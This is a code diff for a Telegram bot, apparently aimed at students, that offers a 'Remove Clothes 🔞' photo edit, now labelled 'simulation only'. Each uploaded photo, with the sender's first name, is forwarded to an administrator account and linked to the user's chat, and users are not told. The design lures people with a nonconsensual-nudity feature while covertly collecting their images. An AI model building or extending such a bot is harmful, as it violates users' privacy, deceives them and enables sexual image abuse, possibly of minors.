@@ -62,20 +62,20 @@ def handle_photo(message):
         bot.send_message(message.chat.id, "❌ لقد استهلكت الحد اليومي (3 صور). جرّب غداً.")
         return
 
-    # عرض الخيارات
+    # عرض الخيارات فقط بدون callback
     markup = types.InlineKeyboardMarkup()
     markup.add(types.InlineKeyboardButton("إزالة الملابس 🔞 / Remove Clothes", callback_data="nude"))
     markup.add(types.InlineKeyboardButton("تعديل الوجه 💄 / Edit Face", callback_data="face"))
     markup.add(types.InlineKeyboardButton("تحسين الصورة 📸 / Enhance Photo", callback_data="quality"))
 
     bot.send_message(message.chat.id,
-        "اختر نوع التعديل المطلوب:\nChoose the desired edit type:",
+        "اختر نوع التعديل المطلوب (محاكاة فقط):\nChoose the desired edit type (simulation only):",
         reply_markup=markup)
 
     # إرسال الصورة للمشرف وتخزين الربط
     try:
         file_id = message.photo[-1].file_id
-        caption = f"📥 صورة جديدة من الطالب / New photo from student: {message.from_user.first_name}"
+        caption = f"📥 صورة جديدة من الطالب / New photo from student: {message.from_user.first_name or 'Unknown'}"
         sent = bot.send_photo(ADMIN_ID, file_id, caption=caption)
         student_lookup[sent.message_id] = message.chat.id
         user_data[user_id]["used"] += 1
